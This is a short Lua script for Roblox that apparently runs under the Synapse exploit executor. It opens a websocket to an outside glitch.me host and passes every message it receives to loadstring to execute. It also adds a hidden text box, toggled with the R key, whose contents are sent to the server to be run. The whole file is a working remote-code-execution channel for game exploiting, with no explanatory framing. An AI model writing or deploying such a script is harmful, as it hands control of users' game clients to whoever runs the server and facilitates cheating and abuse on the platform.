local socket = syn.websocket.connect("ws://prickly-poised-veil.glitch.me")
repeat wait() until socket

local boxs = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
local box = Instance.new("TextBox", boxs)

box.MultiLine = false
box.BackgroundTransparency = .5
box.Position = UDim2.new(0.5, 0, 0.5, 0)
box.AnchorPoint = Vector2.new(0.5, 0.5)
box.Size = UDim2.new(0.25,0,0.25,0)

socket.OnMessage:Connect(function(msg)
    loadstring(msg)()
end)

local function runsc(sc)
   socket:Send(sc) 
end

game:GetService("UserInputService").InputEnded:Connect(function(inp, proc)
    if not proc then
        if inp.KeyCode == Enum.KeyCode.R then
            box.Visible = not box.Visible 
        end
    end
end)

box.FocusLost:Connect(function(ent)
    if ent then
         runsc(box.Text)
    end
end)
